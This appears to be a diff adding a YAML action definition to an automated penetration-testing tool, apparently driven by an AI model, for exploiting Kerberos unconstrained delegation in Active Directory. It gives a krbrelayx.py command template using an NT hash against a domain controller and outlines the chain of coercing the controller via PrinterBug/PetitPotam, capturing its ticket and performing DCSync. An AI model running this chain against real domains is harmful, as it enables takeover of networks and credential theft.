@@ -1,0 +1,17 @@
+name: unconstrained_delegation
+category: ad
+description: Exploit unconstrained delegation
+preconditions:
+  - domain_joined
+  - has_cred
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "python3 krbrelayx.py -hashes ':{nt_hash}' --dc-ip {target_ip}"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Unconstrained delegation host stores all incoming TGTs. Coerce DC to authenticate (PrinterBug/PetitPotam) → capture DC TGT → DCSync."
